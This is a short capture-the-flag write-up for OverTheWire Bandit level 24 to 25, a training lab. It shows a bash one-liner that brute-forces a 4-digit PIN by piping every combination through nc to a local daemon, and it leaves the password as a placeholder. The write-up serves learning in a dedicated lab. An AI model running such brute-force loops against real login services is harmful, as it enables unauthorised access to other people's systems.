# Bandit Level 24 → 25

## Goal
Brute-force the 4-digit PIN accepted by the local daemon on port 30002.

## Solution path

```bash
for i in $(seq -w 0 9999); do printf '%s %s\n' '<current-password>' "$i"; done | nc localhost 30002 | grep -v 'Wrong'
```

## What I learned
Brute-forcing a constrained 4-digit challenge in the dedicated training lab.

## Note
This file intentionally does not contain passwords. Use the live OverTheWire challenge to obtain them.
